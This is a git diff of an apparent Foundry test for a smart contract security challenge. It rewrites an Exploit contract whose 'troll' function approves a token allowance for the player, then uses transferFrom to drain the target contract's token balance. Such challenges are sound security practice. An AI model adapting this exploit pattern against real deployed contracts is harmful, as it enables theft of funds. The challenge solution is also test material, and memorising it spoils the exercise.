@@ -41,7 +41,7 @@ contract Challenge1Test is Test {
           )
         );
 
-        target.withdraw(contractBalance);
+        token.transferFrom(address(target), player, contractBalance);
 
         //============================//
 
@@ -56,13 +56,10 @@ contract Challenge1Test is Test {
 //          DEFINE ANY NECESSARY CONTRACTS HERE             //
 ////////////////////////////////////////////////////////////*/
 
-// @dev this is the solution
 contract Exploit {
-    address public token;
-    mapping(address => uint256) public balances;
+    IERC20 public token;
 
     function troll(address _player, uint256 _amount) external {
-        balances[_player] = _amount;
+        token.approve(_player, _amount);
     }
-
 }
